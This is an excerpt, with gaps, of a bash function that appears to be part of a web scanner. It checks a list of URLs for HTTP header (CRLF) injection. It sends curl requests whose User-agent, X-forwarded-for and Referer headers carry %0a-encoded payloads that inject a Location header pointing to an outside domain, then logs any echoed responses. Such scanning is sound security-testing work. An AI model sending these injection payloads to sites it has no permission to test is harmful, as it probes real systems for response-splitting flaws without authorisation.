...
checkheadersforinjection(){
	...
	cat $1 | while read url; do
		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
		if [[ $url =~ $regex ]]; then 
			response=$(curl -vLiH "User-agent:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
			...
			response=$(curl -vH "User-agent:" -LiH "X-forwarded-for:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
			if [[ $response == *"Location:estebancano.com.ar/abc.php"* ]] || [[ $response == *"<!-- CH3CK -->"* ]]; then
				echo "\r\n*** Header X-forwarded-for injected: Cookie:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
				((i++))
			fi
			response=$(curl -vH "User-agent:" -LiH "Referer:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
			if [[ $response == *"Location:estebancano.com.ar/abc.php"* ]] || [[ $response == *"<!-- CH3CK -->"* ]]; then
